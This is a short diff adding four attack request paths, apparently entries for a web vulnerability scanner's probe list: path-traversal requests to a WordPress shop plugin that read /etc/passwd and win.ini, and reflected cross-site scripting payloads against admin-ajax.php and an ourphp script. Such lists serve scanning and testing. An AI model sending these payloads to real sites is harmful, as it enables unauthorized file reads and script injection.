@@ -1,0 +1,4 @@
+/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=/etc/passwd
+/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=/Windows/win.ini
+/wp-admin/admin-ajax.php?action=window&callback=</script><img/src/onerror=alert(document.domain)>
+/client/manage/ourphp_tz.php?act=rt&callback=<script>alert(document.domain)</script>
